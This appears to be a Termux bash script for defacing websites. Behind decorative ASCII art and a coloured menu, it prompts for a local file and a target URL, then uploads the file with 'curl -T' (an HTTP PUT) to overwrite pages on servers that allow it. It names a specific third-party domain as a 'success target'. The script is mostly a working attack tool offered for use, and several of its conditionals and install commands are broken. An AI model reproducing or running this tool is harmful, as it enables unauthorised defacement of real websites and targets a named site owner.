clear
blue='\033[34;1m'
green='\033[32;1m'
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
white='\033[37;1m'
yellow='\033[33;1m'
run='echo $white"Loading"
sleep 1
echo '
                ,’\   |\
               / /.:  ::
              / :’|| //
             (| | ||;’
             / ||,;’-.._
            : ,;,`’;:.--`
            |:|’`-(\\
            ::: \-’\`’
             \\\ \,-`.
              `’\ `.,-`-._      ,-._
       ,-.       \  `.,-’ `-.  / ,..`.
      / ,.`.      `.  \ _.-’ \’,: ``\ \
     / / :..`-’’’``-)  `.   _.:’’  ’’\ \
    : :  ’’ `-..’’`/    |-’’  |’’  ’’ \ \
    | |  ’’   ’’  :     |__..-;’’  ’’  : :
    | |  ’’   ’’  |     ;    / ’’  ’’  | |
    | |  ’’   ’’  ;    /--../_ ’’_ ’’ _| |
    | |  ’’  _;:_/    :._  /-.’’,-.’’,-. |
    : :  ’’,;’`;/     |_ ,(   `’   `’   \|
     \ \  \(   /\     :,’  \
      \ \.’/  : /    ,)    /
       \ ’:   ’:    / \   :
        `.\    :   :\  \  |
                \  | `. \ |..-_
                 ) |.  `/___-.-`
               ,’  -.’.  `. `’        _,)
               \’\(`.\ `._ `-..___..-’,’
                  `’      ``-..___..-
' | lolcat
trap ctrl_c INT
ctrl_c() {
clear
cowsay 'loading' | lolcat
echo "📆️🕛end the see you,the next time🕧🗓️️" | lolcat
sleep 5
exit
}
figlet "MENU : " | lolcat
echo
echo "1 or 0" | lolcat
echo
echo "1.(DEFACE WEB)" | lolcat
echo
echo "0.(EXIT)" | lolcat
echo
echo $white"»» " | lolcat
echo $green"↙️««️"
echo $green"⬇️"
echo -n $green"↘️➡️➡️➡️➡ »️️ " $blue
read a
if [ $a = 1 ] || [ $a = 1 ]
then
clear
echo -n $green"file name »» "
read b
echo
figlet $b | lolcat
echo
toilet -f big -F gay LINK
toilet -f big -F gay TARGET
echo
echo $white"succes target"
echo $cyan"http://infussion.co.za"
echo
echo -n $white"TARGET LINK »» "$cyan
read bb
echo
figlet $bb | lolcat
echo
echo "1. contine " | lolcat
echo
echo "0. exit " | lolcat
echo -n $white"»» : "
read L
if [ $L = 1 ] || [ $L = 1 ]
then
echo '1.(/storage/emulated/0)|(internal)' | lolcat
echo
echo '2.(/sdcard)|(external)' | lolcat
echo
echo -n '»» : '
read L2
fi
if [ $L2 = 1 ] || [ $L2 ]
then
echo $green"Loading"
curl -T /storage/emulated/0/$b $bb
echo
echo $white"silahkan cek di $blue » $green $bb/$b $blue «"
sleep 3
exit
fi
if [ $L2 = 2 ] || [ $L2 = 2 ]
then
echo $green"Loading"
curl -T /sdcard/$b $bb
echo
echo $white"silahkan cek di $blue » $green $bb/$b $blue «"
sleep 3
exit
fi
if [ $L = 0 ] || [ $L = 0 ]
then
ctrl_c
fi
fi
if [ $a = 0 ] || [ $a = 0 ]
then
ctrl_c
exit
fi'

echo '1.run' | lolcat
echo
echo '2.install and run' | lolcat
echo
echo -n ' »» ' | lolcat $green
read abc
if [ $abc = 1 ] || [ $abc = 1 ]
then
$run
fi
if [ $abc = 2 ] || [ $abc = 2]
then
echo $green'Installing'
pkg update && upgrade
pkg install figlet
pkg install curl
pkg install libcurl
pkg install ruby
gem install lolcat
clear
$run
fi
